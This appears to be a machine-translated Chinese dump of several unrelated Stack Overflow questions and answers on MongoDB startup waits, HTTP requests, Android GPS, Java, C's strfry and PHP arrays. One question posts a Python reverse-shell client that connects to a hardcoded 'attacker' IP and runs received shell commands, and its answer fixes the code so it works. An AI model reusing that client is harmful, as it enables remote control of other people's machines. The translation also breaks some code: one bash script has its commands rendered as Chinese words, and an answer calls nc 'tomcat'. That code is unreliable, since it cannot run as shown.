* * *

## 回答 #2

> 赞同：14
> 
> 时间：2017-07-12T14:24:00.393

使用 MongoDB 工具的解决方案。在 docker 容器或您不想安装的类似容器中很有用`nc`。

```
until mongo --eval "print(\"waited for connection\")"
  do
    sleep 60
  done 
```

根据其他人的回答。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-12-03T14:42:56.730

我最近遇到了同样的问题。我决定将*mongod*配置为将其所有输出记录到日志文件中，然后在循环中等待检查​​日志文件，直到我们看到一些表明 mongod 已准备好的输出。

这是我们需要等待的示例日志文件输出行：

```
Tue Dec  3 14:25:28.217 [initandlisten] waiting for connections on port 27017 
```

这是我想出的 bash 脚本：

```
#!/bin/bash

# 初始化一个mongo数据文件夹和日志文件
mkdir -p /data/db
触摸 /var/log/mongodb.log

# 使用日志记录启动 mongodb
# --logpath 没有这个 mongod 会将所有日志信息输出到标准输出。
# --logappend 确保 mongod 将新条目附加到日志文件的末尾。我们先创建它，这样下面的尾巴总能找到一些东西
/usr/bin/mongod --quiet --logpath /var/log/mongodb.log --logappend &

# 等到 mongo 记录它准备好（或 60 秒后超时）
计数器=0
grep -q '等待端口连接' /var/log/mongodb.log
而 [[ $? -ne 0 && $COUNTER -lt 60 ]] ; 做
    睡觉 2
    让计数器+=2
    echo "正在等待 mongo 初始化...（到目前为止 $COUNTER 秒）"
    grep -q '等待端口连接' /var/log/mongodb.log
完毕

# 现在我们知道 mongo 已经准备好了，可以继续执行其他命令
...

```

请注意，脚本不会永远等待，它会在 60 秒后超时 - 根据您的用例，您可能想要也可能不想要。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2019-05-22T20:46:04.817

在创建用户之前，我需要在 Docker 中运行 Mongo 进行初始化。我结合了 Tom 和 Björn 的答案。这是我正在使用的脚本：

```
#!/bin/bash

# Wait until Mongo is ready to accept connections, exit if this does not happen within 30 seconds
COUNTER=0
until mongo --host ${MONGO_HOST} --eval "printjson(db.serverStatus())"
do
  sleep 1
  COUNTER=$((COUNTER+1))
  if [[ ${COUNTER} -eq 30 ]]; then
    echo "MongoDB did not initialize within 30 seconds, exiting"
    exit 2
  fi
  echo "Waiting for MongoDB to initialize... ${COUNTER}/30"
done

# Connect to the MongoDB and execute the create users script
mongo ${FWRD_API_DB} /root/create-user.js --host ${MONGO_HOST} -u ${MONGO_ROOT_USER} -p ${MONGO_ROOT_PASSWORD} --authenticationDatabase admin 
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2017-03-03T12:04:13.507

虽然汤姆的答案在大多数情况下都可以很好地工作，但如果您使用`-e`标志运行脚本，它可能会失败。`set -e`我的意思是你在最上面运行你的脚本。为什么？因为汤姆的回答依赖于上一个命令的退出状态，在这种情况下`grep -q`如果找不到所需的字符串就会失败，因此整个脚本都会失败。`-e`标志文档提供了有关如何避免此问题的线索：

> 如果失败的命令是紧跟在 while 或 until 关键字之后的命令列表的一部分、if 语句中测试的一部分、在 && 或 || 中执行的任何命令的一部分，则 shell 不会退出 列出除了最后一个 && 或 || 之后的命令，管道中除最后一个之外的任何命令，或者命令的返回状态是否用 ! 反转。

因此，一种解决方案是使 grep 命令成为 while 条件的一部分。但是，由于他使用该选项运行 mongodb，`--logappend`因此搜索字符串可能会作为先前运行的结果出现。我将其他人的答案与汤姆的答案结合起来，效果非常好：

```
# Wait until mongo logs that it's ready (or timeout after 60s)
COUNTER=0
while !(nc -z localhost 27017) && [[ $COUNTER -lt 60 ]] ; do
    sleep 2
    let COUNTER+=2
    echo "Waiting for mongo to initialize... ($COUNTER seconds so far)"
done 
```

我发现使用 tomcat 是最好的解决方案，因为它实际上测试是否有东西在听。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-10-25T09:40:50.813

## 可能的 Docker 解决方案：

鉴于`docker_id`对我来说，它的工作原理`docker logs`如下：

```
until [ $(docker logs --tail all $docker_id | grep "waiting for connections on port" | wc -l) -gt 0 ]; do
    printf '.'
    sleep 1
done 
```

然后继续任何依赖于 mongo 的任务。

# http - Netflix 的 HTTP GET

> ID：15443108
> 
> 赞同：0
> 
> 时间：2013-03-15T22:31:02.647
> 
> 标签：http, cookies, netflix

我尝试使用命令提示符对 netflix 主页发出 GET 请求，因为返回给我的响应一直是 302/301。所以我通过以下方式连接到 netflix：

```
telnet signup.netflix.com 80 
```

然后我提出的要求是

```
GET / HTTP/1.1
Host: signup.netflix.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-gb,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive 
```

正如我访问 netflix 时从 LiveHTTPHeaders 完全复制的那样，但是我删除了 Cookie 部分，因为我不知道浏览器（FireFox）从哪里获取这些值

Netflix 回应

[![ ](../Images/e2c5f1e1d18a0baaca4bff88be6bb72b.png)](https://i.stack.imgur.com/SV18s.png)

为什么我没有得到 200 OK 状态码？是因为我没有发送任何cookies吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T22:33:43.877

它正在重定向到`https://signup.netflix.com/?tcw=2`. 即，它希望您使用`twc=2`查询字符串中的变量重新发送请求，**更重要**的是，使用它刚刚通过标头提供给您的 cookie `Set-Cookie`。

# ember.js - 访问 ArrayController 中的计算属性

> ID：15443109
> 
> 赞同：0
> 
> 时间：2013-03-15T22:31:09.403
> 
> 标签：ember.js

使用此控制器：

```
CMS.PeopleController = Em.ArrayController.extend
    orderedNames: ( ->
        // Some ordering here...
    ).property "content.names" 
```

...这里什么都没有出现：

```
{{#each controllers.people.orderedNames}}
    <p>Hello {{name}}</p>
{{/each}} 
```

我想那是因为一些绑定到`content`，但我不知道如何让它工作......有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T03:32:12.287

使用 @each 来引用数组中单个项目的属性 [作为依赖键]：`content.@each.name`此外，请确保您的属性是`return`一个值。

# json - 将数据传递到网页（QWebView）

> ID：15443112
> 
> 赞同：0
> 
> 时间：2013-03-15T22:31:13.847
> 
> 标签：json, qt, graph, web, pyside

我正在为解析一些非常嵌套的 JSON 数据的客户端编写 UI。这个 UI 在 PySide 中，我也想包括一些数据的可视化。我最近遇到了 QWebView，这似乎是一种将“令人惊叹的”图表快速嵌入到我的 UI 中的好方法，并且还可以进行配置。

所以问题是，如何向页面发送“信号”和数据？一种可行的方法是将页面手动创建为临时文件并让 webview 浏览到该文件，但我认为应该有更好的方法。有没有？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-16T19:05:35.560

您可能正在寻找[QWebFrame::addToJavaScriptWindowObject()](https://qt-project.org/doc/qt-4.8/qwebframe.html#addToJavaScriptWindowObject)。使用该方法，您可以将 QObjects 导出到 JavaScript。这些对象可以有可以在JS中连接的信号，也可以使用带返回值的属性或方法来获取一些数据。

有关 C++<->JS 桥如何工作的完整概述，请参阅[https://qt-project.org/doc/qt-4.8/qtwebkit-bridge.html](https://qt-project.org/doc/qt-4.8/qtwebkit-bridge.html)。

# php - 如何使我的文件在子域上可用？

> ID：15443117
> 
> 赞同：-4
> 
> 时间：2013-03-15T22:31:42.473
> 
> 标签：php, ftp, file-management

我下载了一个可以在我的本地主机服务器上使用的 PHP 文件管理器服务（类似于 FTP）。我把它放在一个名为“ftp”的文件夹中。是否可以在我的 URL 栏中使用这种格式以某种方式访问​​该文件夹：`http://ftp.localhost`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T22:33:29.233

不，这是不可能的，您必须安装 FTP 服务器才能使用 FTP 协议访问文件，并且您还需要定义子域“ftp.localhost”以指向 FTP 服务。

或者您可以设置本地域以访问像这样的脚本 Find file called `hosts`on location`"C:\Windows\System32\drivers\etc"` 使用记事本或您希望的任何其他编辑器打开它。然后添加这些行

```
127.0.0.1      www.fms.dev
127.0.0.1      fms.dev
127.0.0.1      fms 
```

fms = 文件管理器服务

然后在你的 Apache 配置文件中

```
"C:\apache\conf\extra" 
```

或安装 Apache 的任何其他位置，打开名为的文件`"https-vhosts.conf"`并将这些行添加到其中（最后）

```
 <VirtualHost 127.0.0.1:80>
ServerAdmin your_email@example.com
    DocumentRoot e:/location/to/your/files
    ServerName www.fms.dev
    ServerName fms.dev
    ServerName fms
</VirtualHost> 
```

然后重新启动Apache，你很高兴:)

> 您的文件可以通过域访问`www.fms.dev`或`fms.dev` 仅`fms`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T22:41:52.290

1）主机名可以通过编辑“/etc/hosts”（或windows下的“C:\Windows\System32\drivers\etc\hosts”）与localhost或其他任何东西相关联

2）您必须在您的网络服务器中设置目录（这取决于您拥有的网络服务器）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T22:49:12.297

这个问题的答案完全取决于服务器所有者允许您对您的网络空间和域进行的操作。

如果您是在公共网络服务器上执行此操作，则需要与托管服务提供商联系。许多提供商确实允许您配置子域，并将它们指向特定目录。他们通常还在其控制面板站点上提供配置工具供您进行设置。但是，也有很多托管服务提供商不提供此选项。如果您不确定，请与他们交谈并了解您能做什么。

对于`localhost`- 即您自己的台式机 - 您实际上是托管服务提供商，因此您可以按照自己的喜好对其进行配置；所以理论上，是的，你可以做到这一点。您需要配置 Web 服务器以将`ftp.localhost`子域指向适当的目录，并且您需要将`hosts`文件（或 DNS）配置为指向`ftp.localhost`本地计算机。

如果你不知道如何做这些事情，这可能是一个太大的话题，我无法在这里解决，但在这里提出更多问题将帮助你完成。

# python - 使用 break 读取列表的第一行

> ID：15443118
> 
> 赞同：0
> 
> 时间：2013-03-15T22:31:45.070
> 
> 标签：python, list, break

假设我只想读取文件中的第一行并对其执行某些操作。我选择说：

```
stuff = open('some_file.txt','rb')

for row in stuff:
    # do something to first line
    break
for row in stuff:
    # do something to all other lines 
```

这就像我正在读取文件对象而不是内存中的东西一样单独工作。

有反对这样做的理由吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-15T22:33:18.963

[`next()`您可以使用函数](http://docs.python.org/2/library/functions.html#next)获取第一行：

```
firstline = next(stuff, '')  # default value '' if the file is empty

for row in stuff:
    # rest of the file 
```

这适用于任何可迭代的。如果你有一个行列表，你可以这样做`lines[0]`，或者先调用[`iter()`](http://docs.python.org/2/library/functions.html#iter)列表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T22:37:27.257

[fileinput](http://docs.python.org/2/library/fileinput.html)是一个很棒的模块。

```
for line in fileinput.input(['some_file.txt']):
  if not fileinput.isfirstline():
    data = proces_line(line);
    output(data) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T22:49:44.417

您可以使用`readline()`方法：

```
stuff = open('some_file.txt','rb')

first = stuff.readline()

for row in stuff:
    # do something to all other lines 
```

# android - GPS位置没有被改变android

> ID：15443120
> 
> 赞同：0
> 
> 时间：2013-03-15T22:31:57.707
> 
> 标签：android, gps, location

我正在编写一个简单的应用程序，需要从假设 A 点设置当前 GPS 坐标，然后前往另一个 B 点并让它检测 B 点的坐标。我能够获得 A 点坐标没有问题。我只是没有让它检测 B 点的坐标，它读取的坐标与 A 点的坐标相同。我的手机上安装了应用程序，我在两点之间行驶了一英里。我的清单文件包含所有可能的位置许可。

这是活动代码。

```
public class GPSTrackingActivity extends Activity {

Button btnShowLocation;
Button btnShowEndLocation;

// GPSTracker class
GPSTracker gps;

TextView tvIntialLocation;
TextView tvEndLocation;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    myDBHelper = new DataBaseHelper(GPSTrackingActivity.this);
    tvIntialLocation = (TextView)findViewById(R.id.tvIntialLocation);
    tvEndLocation = (TextView)findViewById(R.id.tvEndLocation);

    // create class object
    gps = new GPSTracker(GPSTrackingActivity.this);     

    btnShowLocation = (Button) findViewById(R.id.btnShowLocation);
    btnShowEndLocation = (Button)findViewById(R.id.btnEndLocation);

    // show location button click event
    btnShowLocation.setOnClickListener(new View.OnClickListener() {

        @Override
        public void onClick(View arg0) {

            // check if GPS enabled
            if(gps.canGetLocation()){

                double latitude = gps.getLatitude();
                double longitude = gps.getLongitude();
                tvIntialLocation.setText("Start Location is - \nLat: " + latitude + "\nLong: " + longitude);

               }else{
                // can't get location
                // GPS or Network is not enabled
                // Ask user to enable GPS/network in settings
                gps.showSettingsAlert();
            }

        }
    });

 // show location button click event
    btnShowEndLocation.setOnClickListener(new View.OnClickListener() {

        @Override
        public void onClick(View arg0) {

            // check if GPS enabled
            if(gps.canGetLocation()){

                double latitude = gps.getLatitude();
                double longitude = gps.getLongitude();
                tvEndLocation.setText("End Location is - \nLat: " + latitude + "\nLong: " + longitude);

            }else{
                // can't get location
                // GPS or Network is not enabled
                // Ask user to enable GPS/network in settings
                gps.showSettingsAlert();
            }

        }
    });

} 
```

}

这是设置 GPS Tracker 类的类。我不确定是否调用了 onLocationChanged，当我开车时位置发生变化时，我没有看到任何 Toast 消息。

```
public class GPSTracker extends Service implements LocationListener {

private final Context mContext;

// flag for GPS status
boolean isGPSEnabled = false;

// flag for network status
boolean isNetworkEnabled = false;

// flag for GPS status
boolean canGetLocation = false;

Location location; // location
double latitude; // latitude
double longitude; // longitude

// The minimum distance to change Updates in meters
private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 10; // 10 meters

// The minimum time between updates in milliseconds
private static final long MIN_TIME_BW_UPDATES = 1000 * 60 * 1; // 1 minute

// Declaring a Location Manager
protected LocationManager locationManager;

public GPSTracker(Context context) {
    this.mContext = context;
    getLocation();
}

public Location getLocation() {
    try {
        locationManager = (LocationManager) mContext
                .getSystemService(LOCATION_SERVICE);

        // getting GPS status
        isGPSEnabled = locationManager
                .isProviderEnabled(LocationManager.GPS_PROVIDER);

        // getting network status
        isNetworkEnabled = locationManager
                .isProviderEnabled(LocationManager.NETWORK_PROVIDER);

        if (!isGPSEnabled && !isNetworkEnabled) {
            // no network provider is enabled
        } else {
            this.canGetLocation = true;
            // First get location from Network Provider
            if (isNetworkEnabled) {
                locationManager.requestLocationUpdates(
                        LocationManager.NETWORK_PROVIDER,
                        MIN_TIME_BW_UPDATES,
                        MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
                Log.d("Network", "Network");
                if (locationManager != null) {
                    location = locationManager
                            .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (location != null) {
                        latitude = location.getLatitude();
                        longitude = location.getLongitude();

                    }
                }
            }
            // if GPS Enabled get lat/long using GPS Services
            if (isGPSEnabled) {
                if (location == null) {
                    locationManager.requestLocationUpdates(
                            LocationManager.GPS_PROVIDER,
                            MIN_TIME_BW_UPDATES,
                            MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
                    Log.d("GPS Enabled", "GPS Enabled");
                    if (locationManager != null) {
                        location = locationManager
                                .getLastKnownLocation(LocationManager.GPS_PROVIDER);
                        if (location != null) {
                            latitude = location.getLatitude();
                            longitude = location.getLongitude();
                        }
                    }
                }
            }
        }

    } catch (Exception e) {
        e.printStackTrace();
    }

    return location;
}

/**
 * Function to get latitude
 * */
public double getLatitude(){
    if(location != null){
        latitude = location.getLatitude();
    }

    // return latitude
    return latitude;
}

/**
 * Function to get longitude
 * */
public double getLongitude(){
    if(location != null){
        longitude = location.getLongitude();
    }

    // return longitude
    return longitude;
}

/**
 * Function to check GPS/wifi enabled
 * @return boolean
 * */
public boolean canGetLocation() {
    return this.canGetLocation;
}

@Override
public void onLocationChanged(Location location) {
    location = getLocation();
    // Testing onLocationChanged:
    String hej1 = Double.toString(location.getLatitude());
    String hej2 = Double.toString(location.getLongitude());
    Toast.makeText(this, "Location: "+"Lat: " + hej1 + "Long: " + hej2,
            Toast.LENGTH_LONG).show();
}

/**
 * Function to show settings alert dialog
 * On pressing Settings button will lauch Settings Options
 * */
public void showSettingsAlert(){
    AlertDialog.Builder alertDialog = new AlertDialog.Builder(mContext);

    // Setting Dialog Title
    alertDialog.setTitle("GPS is settings");

    // Setting Dialog Message
    alertDialog.setMessage("GPS is not enabled. Do you want to go to settings menu?");

    // On pressing Settings button
    alertDialog.setPositiveButton("Settings", new DialogInterface.OnClickListener() {
        public void onClick(DialogInterface dialog,int which) {
            Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
            mContext.startActivity(intent);
        }
    });

    // on pressing cancel button
    alertDialog.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
        public void onClick(DialogInterface dialog, int which) {
        dialog.cancel();
        }
    });

    // Showing Alert Message
    alertDialog.show();
} 
```

}

为什么第二个点没有更新到当前位置？起点和终点显示为相同的 GPS 坐标。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T22:39:09.423

**将onLocationChanged**更改为下面的代码

```
 @Override
    public void onLocationChanged(Location location) {
        this.location = location;
        // Testing onLocationChanged:
        String hej1 = Double.toString(location.getLatitude());
        String hej2 = Double.toString(location.getLongitude());
        Toast.makeText(this, "Location: "+"Lat: " + hej1 + "Long: " + hej2,
            Toast.LENGTH_LONG).show();
    } 
```

您应该在类成员前面加上**m**例如**Location mLocation**；

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-10-30T04:08:56.373

您正在使用`getLastKnownLocation`它始终无法获取更新位置。

我有同样的问题。最后我解决了。您可以使用谷歌`FusedLocationApi`获取位置更新，如谷歌地图应用程序。

服务中的代码示例：

```
 @Override
    public void onCreate() {
if (checkPlayServices()) {

            startFusedLocation();

            registerRequestUpdate(this);
        }
}

 private boolean checkPlayServices() {
        int resultCode = GooglePlayServicesUtil
                .isGooglePlayServicesAvailable(this);
        if (resultCode != ConnectionResult.SUCCESS) {
            if (GooglePlayServicesUtil.isUserRecoverableError(resultCode)) {
                Toast.makeText(getApplicationContext(),
                        "This device is supported. Please download google play services", Toast.LENGTH_LONG)
                        .show();
            } else {
                Toast.makeText(getApplicationContext(),
                        "This device is not supported.", Toast.LENGTH_LONG)
                        .show();

            }
            return false;
        }
        return true;
    }
 public void startFusedLocation() {
        if (mGoogleApiClient == null) {
            mGoogleApiClient = new GoogleApiClient.Builder(this).addApi(LocationServices.API)
                    .addConnectionCallbacks(new GoogleApiClient.ConnectionCallbacks() {
                        @Override
                        public void onConnectionSuspended(int cause) {
                        }

                        @Override
                        public void onConnected(Bundle connectionHint) {

                        }
                    }).addOnConnectionFailedListener(new GoogleApiClient.OnConnectionFailedListener() {

                        @Override
                        public void onConnectionFailed(ConnectionResult result) {

                        }
                    }).build();
            mGoogleApiClient.connect();
        } else {
            mGoogleApiClient.connect();
        }
    }

    public void stopFusedLocation() {
        if (mGoogleApiClient != null) {
            mGoogleApiClient.disconnect();
        }
    }

    public void registerRequestUpdate(final LocationListener listener) {
        mLocationRequest = LocationRequest.create();
        mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);

        mLocationRequest.setInterval(1000); // every second
        //mLocationRequest.setFastestInterval(NOTIFY_INTERVAL/2);

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    LocationServices.FusedLocationApi.requestLocationUpdates(mGoogleApiClient, mLocationRequest, listener);
                } catch (SecurityException e) {
                    e.printStackTrace();
                } catch (Exception e) {
                    e.printStackTrace();
                    if (!isGoogleApiClientConnected()) {
                        mGoogleApiClient.connect();
                    }

                    registerRequestUpdate(listener);

                }
            }
        }, 1000);
    }

    public boolean isGoogleApiClientConnected() {
        return mGoogleApiClient != null && mGoogleApiClient.isConnected();
    }

    @Override
    public void onLocationChanged(Location location) {      
        double lat = location.getLatitude();
        double lon = location.getLongitude();
        Toast.makeText(getApplicationContext(), "NEW LOCATION RECEIVED", Toast.LENGTH_LONG).show();

        String Provider=location.getProvider();

        Log.d("location", "IN ON LOCATION CHANGE, lat=" + lat + ", lon=" + lon);

        //locationManager.removeUpdates(this);

    }

    public void setFusedLatitude(double lat) {
        fusedLatitude = lat;
    }

    public void setFusedLongitude(double lon) {
        fusedLongitude = lon;
    }

    public double getFusedLatitude() {
        return fusedLatitude;
    }

    public double getFusedLongitude() {
        return fusedLongitude;
    } 
```

# java - 在队列的开始处从对象调用方法

> ID：15443121
> 
> 赞同：-1
> 
> 时间：2013-03-15T22:31:59.970
> 
> 标签：java, object, methods, queue, call

在我的驱动程序类中：

```
for (systemClock = 0; systemClock < 200; systemClock = (systemClock + 1)){
        if(((inputQueue.query()).arrivalTime()) == systemClock)
            System.out.println(((inputQueue.remove()).removalTime()));
    } 
```

在 Job 类中：

```
public int arrivalTime()
{
    return arrivalTime;
} 
```

我的问题在第二行代码中。

```
if(((inputQueue.query()).arrivalTime()) == systemClock) 
```

在课堂上，我们制作了一个 basic `QueueObject`，带有一个`query()`返回在队列前面找到的对象的方法。每个对象都是一个作业，其中包含各种变量和方法（在这种情况下，重要的是该对象的“到达时间”）。我试图让这行代码返回对象，并调用该`arrivalTime()`方法/从这个特定对象中找出到达时间。

编辑：我收到编译错误“找不到符号 - 方法到达时间（）”

解决方案编辑：很抱歉造成混乱/糟糕的帖子。我道歉。这是我必须工作的解决方案。我必须将被拉出队列的对象作为 Job 对象。

```
if((((Job)inputQueue.query()).arrivalTime()) == systemClock) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T22:38:31.780

尝试删除多余的括号，并且（以防万一）使用不等式：

```
if (inputQueue.query().arrivalTime() >= systemClock) {
    // ...
} 
```

我假设您的`query()`方法返回一个`Job`对象（如果没有，那么您的`Queue`设计有问题）。

* * *

所以，你的问题是找不到符号。

一些技巧：

1.  方法到达时间（）是否标记为私有？如果是，它应该是公开的。
2.  方法返回的类型是什么？它必须与 systemClock 具有相同的类型，并且记住您只能将 == 用于数字（int、long、double、...）。如果类型不能与 == 进行比较，则需要创建 compareTo() 或 equals() 方法

# java - 如果关闭对话框后循环不会执行（第一次使用 java）Java/Android

> ID：15443134
> 
> 赞同：1
> 
> 时间：2013-03-15T22:32:44.727
> 
> 标签：java, android, loops

通过按下“ok_button”关闭此对话框后，我试图更改文本视图中的文本。但我想循环进行。我将“alleroclosed”设置为布尔值并将其初始化为假。在我按下“ok_button”后，循环不会启动，或者它不会使用我的布尔变量“alleroclosed”

```
{ 
     Button ok_button = (Button) dialog.findViewById(R.id.Ok_button);
     ok_button.setOnClickListener(
         new OnClickListener() 
         {
             @Override
             public void onClick(View v) 
             {
                 alleroclosed=true;
                 dialog.dismiss();
             }
         });

     if(alleroclosed) 
     {
         alleroclosed=false;
         alleroSTATUS.setText("it works");
     }
} 
```

======== 它不会将字符串更改为“它可以工作”

如果您能以任何方式帮助我，我将不胜感激。我是一个真正的新手。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T22:37:52.650

仅当单击“确定”按钮时，布尔值才会设置为 true。该`if`块在您创建和注册监听器后立即执行。

`onClick()`如果您希望在单击确定按钮时执行此代码，则 if vlock 的内容应该在侦听器的方法中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T22:38:13.490

我认为这个问题是你在打电话

```
if (alleroclosed) {
  alleroclosed=false;
  alleroSTATUS.setText("it works");
} 
```

在方法之外，`onClick()`因此它永远不会被应用。

您的代码块直接放置在 onCreate() 方法中，并且在捕获单击事件时不会调用此方法，因此它仅应用一次 - 当 onCreate() 被调用时 alleroclosed = false。

所以当你把它放在`onClick()`方法中时它会起作用。

```
...
public void onClick(View v) {
   alleroclosed = true;
   dialog.dismiss();
   if (alleroclosed) {
      alleroclosed=false;
      alleroSTATUS.setText("it works");
   }
... 
```

}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T23:17:46.540

您要在单击按钮时执行的任务应该写在 onClick() 方法中...在上面的代码中，如果您在单击按钮时对话框关闭后要调用...所以只需将您的 onclick() 设置为以下

```
public void onClick(View v) {
dialog.dismiss();
if (somecondition) {
  // task you want to do...
}
} 
```

以下链接讨论了使用 onClick() 的方法 [如何处理在 Android 中单击的按钮？](https://stackoverflow.com/questions/7082344/how-to-handle-a-button-being-clicked-in-android) 希望它有效...

# c - strfry(char *__string) 返回整数？

> ID：15443137
> 
> 赞同：4
> 
> 时间：2013-03-15T22:33:00.227
> 
> 标签：c

所以我是 C 新手，当我遇到[https://www.gnu.org/software/libc/manual/html_node/strfry.html#strfry时，我正在使用 GNU C 库中的函数](https://www.gnu.org/software/libc/manual/html_node/strfry.html#strfry)

很感兴趣，我写了一个小测试程序：

```
1 #include <stdio.h>
2 #include <string.h>
3 
4 main ()
5 {
6     char *str = "test123abc";
7     char *other;
8 
9     other = strfry(str);
10    printf("%s\n", other);
11     return 0;
12 } 
```

`gcc test.c`输出`test.c:9: warning: assignment makes pointer from integer without a cast`

为什么？

`/usr/include/string.h`有以下条目：

`extern char *strfry (char *__string) __THROW __nonnull ((1));`

怎么可能`char *function(...)`退货`int`？

谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-15T22:36:58.497

由于`strfry`是 GNU 扩展，因此您需要[`#define _GNU_SOURCE`](http://www.gnu.org/software/libc/manual/html_node/Feature-Test-Macros.html#index-g_t_005fGNU_005fSOURCE-51)使用它。如果你没有提供`#define`，声明将不可见，编译器将自动假定函数返回`int`。

正如 perreal 所指出的，一个相关的问题是修改文字字符串是未定义的行为。一旦声明对`strfry`编译器可见，就会及时报告。

请注意，该`strfry`函数及其表亲[`memfrob`](http://www.gnu.org/software/libc/manual/html_node/Trivial-Encryption.html)并不完全严重，并且很少在生产中使用。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-15T22:36:47.950

要`strfry`可用，您需要

```
#define _GNU_SOURCE 
```

否则原型不会暴露并且隐式声明被假定返回一个`int`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-15T22:36:34.763

问题是你没有原型，`strfry()`编译器假设它返回一个`int`. 当它想将该 int 分配给 a`char*`时，它会抱怨您指定的消息。

根据我的手册页，您需要`#define _GNU_SOURCE`在源代码的最顶部，尤其是在标准 #includes 之前

```
#define _GNU_SOURCE
/* rest of your program */ 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-15T22:38:07.043

您不能修改文字字符串：

```
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>

int main () {
  char *str = "test123abc";
  char other[256];
  strcpy(other, str);
  strfry(other);
  printf("%s\n", other);
  return 0;
} 
```

# python - Python - 子进程

> ID：15443138
> 
> 赞同：1
> 
> 时间：2013-03-15T22:33:00.497
> 
> 标签：python, python-3.x, subprocess

我创建了一个 python 程序来让服务器获取客户端 cmd。但其中存在一些问题。我的服务器工作正常，它正在监听，但我不知道 shell 是否工作正常，因为我的客户端出现故障。

```
#! /bin/usr/python
import socket, subprocess

HOST = '81.82.40.78'
PORT = 443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect to server (attacker)
s.connect((HOST, PORT))

# Send we are connected
s.send('Connect established')

# start loop
while 1:
    # Receive shell command
    data = s.recv(1024)
    # Convert to string in case of it being an integer
    # if it's quit, then break out and close socket
    if data == "quit": break
    # Do shell command
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # Read output
        stdout_value = proc.stdout.read() + proc.stderr.read()
        # Send output to server
        s.send(stdout_value)
    # Close socket
    s.close() 
```

给我的错误是：

```
proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
```

名称有问题 - 我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T23:07:58.253

您需要在`if`声明之后修复缩进（仅限于一行）。我将 移到`break`下一行，正确缩进，说明：

```
while 1:
    # Receive shell command
    data = s.recv(1024)
    # Convert to string in case of it being an integer
    # if it's quit, then break out and close socket
    if data == "quit":
        break
    # Do shell command
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    # Read output
    stdout_value = proc.stdout.read() + proc.stderr.read()
    # Send output to server
    s.send(stdout_value)
# Close socket
s.close() 
```

请注意，您从该行开始将*所有内容都*`if`缩进了太多，包括属于循环*之外*的`s.close()`语句。*`while`*

# php - 拉数组 ID 值？

> ID：15443142
> 
> 赞同：0
> 
> 时间：2013-03-15T22:33:21.253
> 
> 标签：php, arrays, loops, key, key-value-store

我正在尝试编写一些 PHP，将值放在 2D 数组中并创建一个表来呈现数据。当我尝试在每一行的末尾创建一个按钮时，我的问题就出现了，我试图根据 SQL 查询中的 $row['ID'] （数组的第一个维度）给它一个唯一的名称。我只是不知道如何在循环上下文中提取这些数据。

```
$result = mysql_query($query) or die(mysql_error());
$num_rows = mysql_num_rows($result);

if ($num_rows > 0){
while($row = mysql_fetch_assoc($result))
    {
    $list[$row['ID']]['ProductionNo']=$row['ProductionNo'];
    $list[$row['ID']]['UserID']=$row['UserID'];
    $list[$row['ID']]['StartTime']=$row['StartTime'];
    $list[$row['ID']]['EndTime']=$row['EndTime'];

    }

$openproduction = '<table><tbody><td>';
foreach ($list as &$value) 
    {
    $openproduction .= '<tr>';
        foreach ($value as &$valueitem)
        {
        $openproduction .= '<td> '.$valueitem.'</td>';
            }
    $openproduction .= "<td><input type='button' name='$key' class='button' ></td></tr></tr>";
    }
$openproduction .= '</tbody></td></table>';
unset($valueitem);
unset($value); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T22:41:47.447

在这一行：

```
foreach ($list as &$value) 
```

采用：

```
foreach ($list as $row_id => &$value) 
```

然后，您将在该循环中拥有一个有效的 $row_id 供您参考。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T22:42:26.683

